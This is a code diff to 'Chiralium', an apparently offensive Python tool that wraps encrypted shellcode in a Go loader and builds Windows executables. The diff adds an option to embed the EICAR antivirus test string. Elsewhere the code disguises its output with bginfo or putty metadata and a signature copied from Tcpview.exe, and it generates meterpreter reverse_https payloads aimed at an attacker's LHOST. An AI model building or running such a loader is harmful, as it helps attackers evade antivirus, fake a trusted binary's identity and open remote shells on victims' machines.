@@ -93,7 +93,7 @@ def safechecks(appdir):
 
 
 	
-def craftgofile(shellcodefile,outputdir,biname,appdir):
+def craftgofile(shellcodefile,outputdir,biname,appdir,eicar):
 	try:
 		print("[+] Using",colored("{0}".format(shellcodefile),"green"),"as hex shellcode ...")
 		# read template GO file
@@ -120,7 +120,15 @@ def craftgofile(shellcodefile,outputdir,biname,appdir):
 		content_go = content_go.replace("_KEY_",key)
 		content_go = content_go.replace("_IV_",iv)
 		content_go = content_go.replace("_SHELLCODE_",shellcode_encrypt)
-
+		if eicar == True:
+			eicar_var_name = ''.join(random.choice(string.ascii_lowercase) for x in range(4))
+			eicar_pattern = "X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+			# eicar_full = """{var} := \"{pattern}\"\n\t_ = {var}""".format(var=eicar_var_name,pattern=eicar_pattern)
+			eicar_full = """{var} := \"{pattern}\"\n\tfmt.Println({var})""".format(var=eicar_var_name,pattern=eicar_pattern)
+			content_go = content_go.replace('// "__EICAR__"',eicar_full)
+		else:
+			content_go = content_go.replace('// "__EICAR__"','// main')
+		print(content_go)
 		
 		# write tmp GO file with current values.
 		# will be use to "go build"
@@ -239,11 +247,12 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description="Chiralium : a dirty GO shellcode-to-binary generator.")
 	parser.add_argument('-p', '--platform', type=str, default=_platform, help="Platform for compilation (windows only for the moment)")
 	parser.add_argument('-sc', '--shellcode', type=str, help="File containing HEX shellcode (41414141)")
-	parser.add_argument('-m', '--metadata', type=str, default="none", help="Choose metadata to add using 'syso' COFF (pre-generated with goversioninfo) : none, bginfo,putty")
+	parser.add_argument('-m', '--metadata', type=str, default="bginfo", help="Choose metadata to add using 'syso' COFF (pre-generated with goversioninfo) : none, bginfo,putty")
 	parser.add_argument('-s', '--signature', type=str, default="signatures/Tcpview.exe_sig", help="Choose signature file to add (default: signatures/Tcpview.exe_sig)")
 	parser.add_argument('-a', '--arch', type=str, default="x86", help="The architecture to use (x86 or x64)")
 	parser.add_argument('-t', '--test', action='store_true', default=False, help="Test to build a default shellcode that spawn a calc.")
 	parser.add_argument('-msf', '--msfvenom', action='store_true', default=False, help="Generate a meterpreter/reverse_https shellcode with msfvenom")
+	parser.add_argument('--eicar', action='store_true', default=False, help="Add the EICAR pattern in binary")
 	parser.add_argument('-lhost','--lhost', type=str, help="LHOST for msfvenom payload generator ")
 	parser.add_argument('-lport','--lport', type=str, default="8443", help="LPORT for msfvenom payload generator (default 8443).")
 	parser.add_argument('-rc','--rc', action='store_true', default=False, help="Autorun the resource file with msfconsole (only with --msfvenom")
@@ -256,7 +265,7 @@ if __name__ == '__main__':
 
 	if args.test:
 		cprint("[-] Test mode activate : ignoring all options, using default.","yellow")
-		craftgofile(_shellcodefile,_outputdir, "test_calc.exe",_appdir)
+		craftgofile(_shellcodefile,_outputdir, "test_calc.exe",_appdir,args.eicar)
 		buildbinary("windows", "386", _outputdir,"test_calc.exe",args.metadata)
 		sign_binary("test_calc.exe",_outputdir,args.signature)
 		sys.exit()
@@ -292,17 +301,17 @@ if __name__ == '__main__':
 
 	# SHELLCODE FILE + CRAFT
 	if args.shellcode:
-		craftgofile(args.shellcode,_outputdir, _biname, _appdir)
+		craftgofile(args.shellcode,_outputdir, _biname, _appdir,args.eicar)
 	elif args.msfvenom == True: 
 		if not args.lhost:
 			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
 			sys.exit()
 		msfvenom_generator(_platform, goarch, _shellcodedir, _biname, args.lhost, args.lport,msfvenomargs)
-		craftgofile("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir)
+		craftgofile("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir,args.eicar)
 	else:
 		print(args.msfvenom)
 		print("[+] No shellcode specify ! Using default {0} ...".format(_shellcodefile))
-		craftgofile(_shellcodefile,_outputdir, _biname, _appdir)
+		craftgofile(_shellcodefile,_outputdir, _biname, _appdir,args.eicar)
 
 	# BINARY BUILDING
 	buildbinary(goos, goarch, _outputdir, _biname,args.metadata)
